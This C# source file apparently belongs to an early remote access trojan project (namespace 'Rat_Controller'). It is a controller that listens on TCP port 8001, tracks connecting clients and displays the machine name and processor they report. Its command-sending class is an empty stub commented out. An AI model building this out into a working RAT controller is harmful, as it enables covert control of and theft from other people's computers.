using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Net.Sockets;
using System.Net;
using System.Windows.Forms;
using System.Runtime.InteropServices;



namespace Rat_Controller
{
    
    class packet
    {
        string name;
        string processor;
    }

    class Networking
    {
       

        public string data;
        public Socket s = null;
        public IPAddress ip = null;
        public TcpListener listen;
        public Networking()
        {

        }

        
        public void startListen()
        {

            try
            {
                s = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);

                ip = IPAddress.Parse("127.0.0.1");


                s.Bind(new IPEndPoint(IPAddress.Any, 8001));
                s.Listen(10);
                s.BeginAccept(AcceptCallback, s);  //start async handling of connections

            }
            catch (Exception ex)
            {
                throw new Exception("Listening Error " + ex);
            }



        }

        public void AcceptCallback(IAsyncResult ar)
        {
            try
            {

                Socket acceptSocket = s.EndAccept(ar); //handoff accepting to acceptSocket to free up main socket
                ClientsControl.AddClient(acceptSocket); //create client object add them to total list of clients

                s.BeginAccept(AcceptCallback, s); //start accepting another connection after handoff
            }
            catch (Exception ex)
            {
                throw new Exception("Base accept error" + ex);
            }
        }

    }

    static class ClientsControl
    {
        public static List<Client> ClientList = new List<Client>();
        public static void AddClient(Socket socket)
        {
            ClientList.Add(new Client(socket, ClientList.Count)); //create object of Class Client, add to list with id = index
        }
        public static void RemoveClient(int id)
        {
            ClientList.RemoveAt(ClientList.FindIndex(x => x.Id == id));
        }

    }
    class Client
    {

        public ReceivePacket Receive { get; set; }
        public int Id { get; set; }
        public Socket _socket { get; set; }
        public Client(Socket socket,int id)
        {
            Receive = new ReceivePacket(socket, id);
            Receive.ReceiveData(); //calls receive packet on construction in the scope of this thread
            _socket = socket;
            Id = id;

        }
    }

    class ReceivePacket
    {
        private int _clientid;
        private byte[] _buffer;
        private Socket _receiveSocket;
        public ReceivePacket(Socket receiveSocket, int id)
        {
            _receiveSocket = receiveSocket;
            _clientid = id;
        }
        public void ReceiveData()
        {
            try
            {
                _buffer = new byte[1024];
                _receiveSocket.BeginReceive(_buffer, 0, _buffer.Length, SocketFlags.None, ReceiveCallback, null); //receive data into the buffer async
            }
            catch { }
        }
        private void ReceiveCallback(IAsyncResult AR)
        {
            try
            {
                int received = _receiveSocket.EndReceive(AR);
                if (received > 1) //if still connected
                {
                    byte[] databuf = new byte[received];
                    Array.Copy(_buffer, databuf, received); //copy from local to main databuf

                    ParsePacket parser = new ParsePacket(databuf);

                   
                    
                    ReceiveData();

                }
                else
                {
                    disconnect();
                }

            }
            catch
            {
                if (!_receiveSocket.Connected)
                {
                    disconnect();
                }
                else
                {
                    ReceiveData();
                }
            }


        }
        public void disconnect()
        {
            _receiveSocket.Disconnect(true);
            ClientsControl.RemoveClient(_clientid); //remove by index if connection closed
        }
    }

    public struct infoPacket
    {
        public string name;
        public string processor;
    };
    class ParsePacket
    {
        public static T ByteArrayToStructure<T>(byte[] bytes) where T : struct
        {
            var handle = GCHandle.Alloc(bytes, GCHandleType.Pinned);
            try
            {
                return (T)Marshal.PtrToStructure(handle.AddrOfPinnedObject(), typeof(T));
            }
            finally
            {
                handle.Free();
            }
        }

        public ParsePacket(byte[] b)
        {
            infoPacket currentInfo = new infoPacket();
            currentInfo = ByteArrayToStructure<infoPacket>(b);

            MessageBox.Show("Name: " + currentInfo.name + "\n" + "Processor: " + currentInfo.processor);
      
           
        }

    }


    /*  class sendPacket
      {
          private int _clientid;
          private byte[] _buffer;
          private Socket _sendSocket;

          sendPacket(Socket sendsocket,int id)
          {
              _sendSocket = sendsocket;
              _clientid = id;
              SendData();
          }

          public void SendData()
          {

          }

      }*/



}
